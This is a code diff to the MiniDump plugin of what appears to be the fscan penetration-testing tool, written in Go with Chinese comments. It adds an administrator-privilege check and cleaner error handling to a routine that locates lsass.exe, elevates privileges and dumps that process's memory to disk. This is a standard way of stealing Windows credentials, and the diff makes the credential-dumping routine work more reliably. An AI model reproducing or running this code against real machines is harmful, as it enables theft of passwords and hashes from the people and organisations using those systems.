@@ -3,7 +3,7 @@ package Plugins
 import (
 	"fmt"
 	"github.com/shadow1ng/fscan/Common"
-	"log"
+	"golang.org/x/sys/windows"
 	"os"
 	"path/filepath"
 	"syscall"
@@ -254,22 +254,47 @@ func (pm *ProcessManager) FindProcess(name string) (uint32, error) {
 	return pm.findProcessInSnapshot(snapshot, name)
 }
 
+// 检查是否具有管理员权限
+func IsAdmin() bool {
+	var sid *windows.SID
+	err := windows.AllocateAndInitializeSid(
+		&windows.SECURITY_NT_AUTHORITY,
+		2,
+		windows.SECURITY_BUILTIN_DOMAIN_RID,
+		windows.DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0,
+		&sid)
+	if err != nil {
+		return false
+	}
+	defer windows.FreeSid(sid)
+
+	token := windows.Token(0)
+	member, err := token.IsMember(sid)
+	return err == nil && member
+}
+
 func MiniDump(info *Common.HostInfo) (err error) {
+	// 先检查管理员权限
+	if !IsAdmin() {
+		return fmt.Errorf("需要管理员权限才能执行此操作")
+	}
+
 	pm, err := NewProcessManager()
 	if err != nil {
-		log.Fatalf("初始化进程管理器失败: %v", err)
+		return fmt.Errorf("初始化进程管理器失败: %v", err)
 	}
 
 	// 查找 lsass.exe
 	pid, err := pm.FindProcess("lsass.exe")
 	if err != nil {
-		log.Fatalf("查找进程失败: %v", err)
+		return fmt.Errorf("查找进程失败: %v", err)
 	}
 	fmt.Printf("找到进程 lsass.exe, PID: %d\n", pid)
 
 	// 提升权限
 	if err := pm.ElevatePrivileges(); err != nil {
-		log.Fatalf("提升权限失败: %v", err)
+		return fmt.Errorf("提升权限失败: %v", err)
 	}
 	fmt.Println("成功提升进程权限")
 
@@ -278,8 +303,8 @@ func MiniDump(info *Common.HostInfo) (err error) {
 
 	// 执行转储
 	if err := pm.DumpProcess(pid, outputPath); err != nil {
-		log.Fatalf("进程转储失败: %v", err)
 		os.Remove(outputPath)
+		return fmt.Errorf("进程转储失败: %v", err)
 	}
 
 	fmt.Printf("成功将进程内存转储到文件: %s\n", outputPath)
